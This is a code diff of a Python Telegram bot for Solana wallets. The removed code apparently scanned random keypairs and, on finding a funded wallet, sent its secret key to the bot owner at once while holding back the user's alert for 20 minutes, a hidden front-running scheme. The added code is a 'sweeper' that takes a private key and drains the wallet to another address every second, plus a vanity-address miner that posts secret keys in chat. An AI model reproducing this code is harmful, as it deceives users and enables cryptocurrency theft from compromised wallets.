@@ -1,192 +1,225 @@
-import telebot
-import threading
-import time
+import subprocess
+import sys
 import os
+import time
+import threading
+import base58
+from datetime import datetime
+# --- IMPORTS ---
+import telebot
 from telebot import types
 from solana.rpc.api import Client
 from solders.keypair import Keypair
+from solders.pubkey import Pubkey
+from solders.system_program import TransferParams, transfer
+from solana.transaction import Transaction
 from dotenv import load_dotenv
 
-# 1. Load Environment Variables
 load_dotenv()
+BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 
-BOT_TOKEN = os.getenv("NEW_TELEGRAM_BOT_TOKEN")
-OWNER_ID = os.getenv("OWNER_ID")
-
-# Validation
 if not BOT_TOKEN:
     print("❌ ERROR: TELEGRAM_BOT_TOKEN not found in .env")
     exit(1)
 
-if not OWNER_ID:
-    print("❌ CRITICAL ERROR: OWNER_ID not found in .env")
-    print("You must set your Telegram ID to receive the keys first.")
-    exit(1)
-else:
-    OWNER_ID = int(OWNER_ID)
-
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# Store user states
+# Structure: { chat_id: { 'mode': 'sweep'/'vanity', 'sweep_running': bool, 'vanity_running': bool } }
 user_sessions = {}
 
-# --- DELAYED SENDER ---
-def delayed_user_notification(chat_id, message):
-    """Waits 20 minutes before sending the message to the user"""
-    time.sleep(20 * 60) # 20 Minutes in seconds
-    try:
-        bot.send_message(chat_id, message, parse_mode='HTML')
-    except Exception as e:
-        print(f"Failed to send delayed msg to {chat_id}: {e}")
-
-# --- ADMIN HELPER ---
-def notify_admin(message):
-    try:
-        bot.send_message(OWNER_ID, f"🔔 **ADMIN ALERT:**\n{message}", parse_mode='Markdown')
-    except Exception:
-        pass
+# RPC URL (Public Mainnet)
+RPC_URL = os.getenv("CUSTOM_RPC")
+if not RPC_URL:
+    print("error in RPC. using default")
+    RPC_URL = "https://api.mainnet-beta.solana.com"
+client = Client(RPC_URL)
 
 # --- MENUS ---
 def get_main_menu():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn_start = types.KeyboardButton('🚀 Start Scanning')
-    btn_status = types.KeyboardButton('📊 Status')
-    btn_stop = types.KeyboardButton('🛑 Stop')
-    markup.add(btn_start, btn_status, btn_stop)
+    btn_sweep = types.KeyboardButton('🧹 Wallet Sweeper')
+    btn_vanity = types.KeyboardButton('💎 Vanity Address')
+    btn_stop = types.KeyboardButton('🛑 Stop All Tasks')
+    markup.add(btn_sweep, btn_vanity, btn_stop)
     return markup
 
-def get_rpc_menu():
+def get_cancel_menu():
     markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
-    btn_public = types.KeyboardButton('🌐 Use Public Mainnet')
-    btn_cancel = types.KeyboardButton('🔙 Cancel')
-    markup.add(btn_public, btn_cancel)
+    markup.add(types.KeyboardButton('🔙 Cancel'))
     return markup
 
-# --- SCANNER WORKER ---
-def scanner_worker(chat_id):
+# --- WORKER: WALLET SWEEPER ---
+def sweeper_worker(chat_id, private_key_str, dest_address):
     session = user_sessions.get(chat_id)
     if not session: return
 
-    rpc_url = session['rpc']
-    
     try:
-        client = Client(rpc_url)
-        client.get_epoch_info()
+        # Decode private key (supports Base58 string or list of ints)
+        if "[" in private_key_str:
+            import json
+            pk_bytes = bytes(json.loads(private_key_str))
+            sender_kp = Keypair.from_bytes(pk_bytes)
+        else:
+            sender_kp = Keypair.from_base58_string(private_key_str)
+            
+        dest_pubkey = Pubkey.from_string(dest_address)
+        sender_pubkey = sender_kp.pubkey()
+        
+        bot.send_message(chat_id, f"👀 **Sweeper Active!**\nWatching: `{sender_pubkey}`\nForwarding to: `{dest_pubkey}`", parse_mode='Markdown')
+        
     except Exception as e:
-        bot.send_message(chat_id, f"⚠️ **RPC Error:**\n`{str(e)}`", parse_mode='Markdown', reply_markup=get_main_menu())
-        session['running'] = False
+        bot.send_message(chat_id, f"❌ Key Error: {e}")
+        session['sweep_running'] = False
         return
 
-    bot.send_message(chat_id, "✅ **RPC Connected!** Hunting...", parse_mode='Markdown')
-
-    while session.get('running', False):
-        session['attempts'] += 1
-        
+    while session.get('sweep_running'):
         try:
-            kp = Keypair()
-            resp = client.get_balance(kp.pubkey())
-            balance = resp.value
+            # Check Balance
+            balance_resp = client.get_balance(sender_pubkey)
+            balance = balance_resp.value
+            
+            # Fee buffer (5000 lamports for sig + wiggle room)
+            FEE_BUFFER = 5000 
 
-            if balance > 0:
-                sol = balance / 1_000_000_000
-                secret_str = str(kp.secret()) # Byte array as string
+            if balance > FEE_BUFFER:
+                amount_to_send = balance - FEE_BUFFER
                 
-                # 1. Prepare Messages
-                admin_msg = (
-                    f"💰 **WALLET FOUND! (User: `{chat_id}`)**\n"
-                    f"Balance: `{sol} SOL`\n"
-                    f"Address: `{kp.pubkey()}`\n"
-                    f"Secret: `{secret_str}`\n\n"
-                    f"ℹ️ _User will be notified in 20 mins._"
-                )
+                # Create Transaction
+                ix = transfer(TransferParams(
+                    from_pubkey=sender_pubkey,
+                    to_pubkey=dest_pubkey,
+                    lamports=amount_to_send
+                ))
                 
-                user_msg = (
-                    f"🚨 <b>FOUND FUNDED WALLET!</b> 🚨\n\n"
-                    f"💰 <b>Balance:</b> {sol} SOL\n"
-                    f"🔑 <b>Address:</b> <code>{kp.pubkey()}</code>\n"
-                    f"🔐 <b>Secret:</b> <code>{secret_str}</code>"
-                )
-
-                # 2. Notify Admin IMMEDIATELY
-                bot.send_message(OWNER_ID, admin_msg, parse_mode='Markdown')
+                txn = Transaction().add(ix)
+                recent_blockhash = client.get_latest_blockhash().value.blockhash
+                txn.recent_blockhash = recent_blockhash
                 
-                # 3. Schedule User Notification (20 Min Delay)
-                # We start a new thread so the scanner doesn't freeze
-                threading.Thread(target=delayed_user_notification, args=(chat_id, user_msg)).start()
-
-        except Exception:
+                # Send
+                resp = client.send_transaction(txn, sender_kp)
+                
+                sol_amt = amount_to_send / 1_000_000_000
+                bot.send_message(chat_id, f"🧹 **SWEPT!**\nMoved {sol_amt} SOL\nSig: `{resp.value}`", parse_mode='Markdown')
+                
+                # Optional: Sleep longer after success
+                time.sleep(10)
+            
+        except Exception as e:
+            print(f"Sweep Error: {e}")
             time.sleep(2)
+            
+        time.sleep(1) # Check every second
 
-        time.sleep(0.05) 
+# --- WORKER: VANITY GENERATOR ---
+def vanity_worker(chat_id, prefix):
+    session = user_sessions.get(chat_id)
+    session['vanity_running'] = True
+    
+    bot.send_message(chat_id, f"🔨 **Mining Vanity Address...**\nPrefix: `{prefix}`\n(This may take time)", parse_mode='Markdown')
+    
+    attempts = 0
+    start_time = time.time()
+    
+    while session.get('vanity_running'):
+        attempts += 1
+        kp = Keypair()
+        addr = str(kp.pubkey())
+        
+        # Check matching prefix (Case Sensitive)
+        if addr.startswith(prefix):
+            duration = round(time.time() - start_time, 2)
+            msg = (
+                f"💎 **VANITY FOUND!** ({duration}s)\n\n"
+                f"🔑 Address: `{addr}`\n"
+                f"🔐 Secret: `{kp.secret()}`"
+            )
+            bot.send_message(chat_id, msg, parse_mode='Markdown')
+            session['vanity_running'] = False
+            return
+            
+        # UI Update every 10k attempts
+        if attempts % 10000 == 0:
+            # print(f"User {chat_id}: {attempts} attempts...")
+            pass
 
 # --- HANDLERS ---
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    bot.send_message(message.chat.id, "👋 **Solana Sweeper Bot**", parse_mode='Markdown', reply_markup=get_main_menu())
+    bot.send_message(message.chat.id, "🤖 **Solana Utility Bot**\nSelect a tool:", reply_markup=get_main_menu())
 
-@bot.message_handler(func=lambda m: m.text == '🚀 Start Scanning')
-def request_rpc(message):
-    chat_id = message.chat.id
-    if chat_id in user_sessions and user_sessions[chat_id].get('running'):
-        bot.send_message(chat_id, "⚠️ Already running!", reply_markup=get_main_menu())
-        return
-    msg = bot.send_message(chat_id, "🔗 **Select RPC:**", reply_markup=get_rpc_menu())
-    bot.register_next_step_handler(msg, process_rpc_input)
+# --- SWEEPER FLOW ---
+@bot.message_handler(func=lambda m: m.text == '🧹 Wallet Sweeper')
+def sweep_ask_key(message):
+    msg = bot.send_message(message.chat.id, "🔐 Enter the **Source Private Key** (Base58 or Array) to drain from:", reply_markup=get_cancel_menu())
+    bot.register_next_step_handler(msg, sweep_get_dest)
 
-def process_rpc_input(message):
-    chat_id = message.chat.id
-    text = message.text.strip()
+def sweep_get_dest(message):
+    if message.text == '🔙 Cancel':
+        return start_command(message)
+        
+    src_key = message.text.strip()
+    msg = bot.send_message(message.chat.id, "🏦 Enter the **Destination Address** (Where to send funds):", reply_markup=get_cancel_menu())
+    bot.register_next_step_handler(msg, lambda m: sweep_start(m, src_key))
+
+def sweep_start(message, src_key):
+    if message.text == '🔙 Cancel':
+        return start_command(message)
     
-    if text == '🔙 Cancel':
-        bot.send_message(chat_id, "Cancelled.", reply_markup=get_main_menu())
-        return
-
-    rpc_url = "https://api.mainnet-beta.solana.com" if text == '🌐 Use Public Mainnet' else text
-
-    if not rpc_url.startswith("http"):
-        msg = bot.send_message(chat_id, "❌ Invalid URL.", reply_markup=get_rpc_menu())
-        bot.register_next_step_handler(msg, process_rpc_input)
-        return
-
-    user_sessions[chat_id] = {'running': True, 'attempts': 0, 'rpc': rpc_url}
-    threading.Thread(target=scanner_worker, args=(chat_id,), daemon=True).start()
-    bot.send_message(chat_id, f"🚀 **Started!** Target: `{rpc_url}`", parse_mode='Markdown', reply_markup=get_main_menu())
-    
-    if chat_id != OWNER_ID:
-        notify_admin(f"👤 User `{chat_id}` **STARTED** scanning.")
-
-@bot.message_handler(func=lambda m: m.text == '📊 Status')
-def status_handler(message):
+    dest_addr = message.text.strip()
     chat_id = message.chat.id
     
-    if chat_id == OWNER_ID:
-        active = [uid for uid, s in user_sessions.items() if s['running']]
-        total = sum(s['attempts'] for s in user_sessions.values())
-        bot.send_message(chat_id, f"👑 **ADMIN**\nActive: `{len(active)}`\nTotal Scans: `{total}`", parse_mode='Markdown')
+    if chat_id not in user_sessions: user_sessions[chat_id] = {}
+    user_sessions[chat_id]['sweep_running'] = True
+    
+    threading.Thread(target=sweeper_worker, args=(chat_id, src_key, dest_addr), daemon=True).start()
+    bot.send_message(chat_id, "✅ Sweeper thread started.", reply_markup=get_main_menu())
+
+# --- VANITY FLOW ---
+@bot.message_handler(func=lambda m: m.text == '💎 Vanity Address')
+def vanity_ask_prefix(message):
+    msg = bot.send_message(
+        message.chat.id, 
+        "🔤 Enter desired **Prefix** (Case Sensitive).\n\n"
+        "⚠️ _Warning: 1-3 chars is fast. 4+ chars may take very long._\n"
+        "Ex: `cool` or `Sol`", 
+        parse_mode='Markdown',
+        reply_markup=get_cancel_menu()
+    )
+    bot.register_next_step_handler(msg, vanity_start)
+
+def vanity_start(message):
+    if message.text == '🔙 Cancel':
+        return start_command(message)
+        
+    prefix = message.text.strip()
+    chat_id = message.chat.id
+    
+    # Validation
+    allowed_chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
+    if not all(c in allowed_chars for c in prefix):
+        bot.send_message(chat_id, "❌ Invalid Base58 characters (0, O, I, l are not allowed).", reply_markup=get_main_menu())
+        return
+        
+    if len(prefix) > 5:
+        bot.send_message(chat_id, "❌ Prefix too long (Max 5 chars for cloud bots).", reply_markup=get_main_menu())
         return
 
-    session = user_sessions.get(chat_id)
-    if not session or not session.get('running'):
-        bot.send_message(chat_id, "😴 Idle", reply_markup=get_main_menu())
+    if chat_id not in user_sessions: user_sessions[chat_id] = {}
+    threading.Thread(target=vanity_worker, args=(chat_id, prefix), daemon=True).start()
+
+# --- GLOBAL STOP ---
+@bot.message_handler(func=lambda m: m.text == '🛑 Stop All Tasks')
+def stop_all(message):
+    chat_id = message.chat.id
+    if chat_id in user_sessions:
+        user_sessions[chat_id]['sweep_running'] = False
+        user_sessions[chat_id]['vanity_running'] = False
+        bot.send_message(chat_id, "🛑 All background tasks stopped.", reply_markup=get_main_menu())
     else:
-        bot.send_message(chat_id, f"🔄 Scanned: `{session['attempts']}`", parse_mode='Markdown')
-
-@bot.message_handler(func=lambda m: m.text == '🛑 Stop')
-def stop_handler(message):
-    chat_id = message.chat.id
-    session = user_sessions.get(chat_id)
-    if session and session.get('running'):
-        session['running'] = False
-        bot.send_message(chat_id, "🛑 **Stopped.**", reply_markup=get_main_menu())
-        if chat_id != OWNER_ID:
-            notify_admin(f"👤 User `{chat_id}` **STOPPED**.")
-        del user_sessions[chat_id]
-    else:
-        bot.send_message(chat_id, "⚠️ No active scan.", reply_markup=get_main_menu())
+        bot.send_message(chat_id, "⚠️ Nothing running.", reply_markup=get_main_menu())
 
 if __name__ == "__main__":
-    print("🤖 Bot started...")
-    try:
-        bot.remove_webhook()
-        bot.infinity_polling()
-    except Exception as e:
-        print(f"Error: {e}")
+    print("🤖 Bot Started...")
+    bot.infinity_polling()
